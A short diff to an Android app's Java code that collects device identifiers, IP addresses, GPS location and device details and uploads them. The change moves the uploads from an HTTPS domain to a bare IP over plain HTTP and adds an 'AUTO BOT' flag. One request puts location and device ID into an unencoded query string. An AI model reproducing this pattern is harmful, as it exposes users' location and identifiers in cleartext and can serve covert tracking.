@@ -283,7 +283,7 @@ public class MainActivity extends AppCompatActivity {
                     device_details_string += "\n";
                     device_details_string += webgl;
                     RequestBody requestBody = new FormBody.Builder()
-                            .add("flag", "0")
+                            .add("flag", "1")       // AUTO BOT
                             .add("android_id", android_id)
                             .add("ipv4", ip_string)
                             .add("ipv6", ipv6_string)
@@ -291,7 +291,7 @@ public class MainActivity extends AppCompatActivity {
                             .add("longitude", location_longitutde_string)
                             .add("device_details", device_details_string)
                             .build();
-                    postAPI("https://citysourcing.in/api/saveData.php", requestBody);
+                    postAPI("http://64.227.160.45/storeDevice.php", requestBody);
                     new StoreIPLocation(getApplicationContext(), android_id, ip_string, location_string, ip_city).execute();
                     MainActivity.location_status = false;
                     MainActivity.network_location_status = false;
@@ -1067,7 +1067,7 @@ class StoreIPLocation extends AsyncTask<String, String, String> {
         String response = "";
 
         try  {
-            socket = new URL("https://citysourcing.in/ip_location.php?device_id=" + device_id + "&ip=" + ip + "&location=" + location + "&city=" + city).openConnection();
+            socket = new URL("http://64.227.160.45/ip_location.php?device_id=" + device_id + "&ip=" + ip + "&location=" + location + "&city=" + city).openConnection();
             socket.setUseCaches( false );
             socket.setDefaultUseCaches( false );
             HttpURLConnection conn = ( HttpURLConnection )socket;
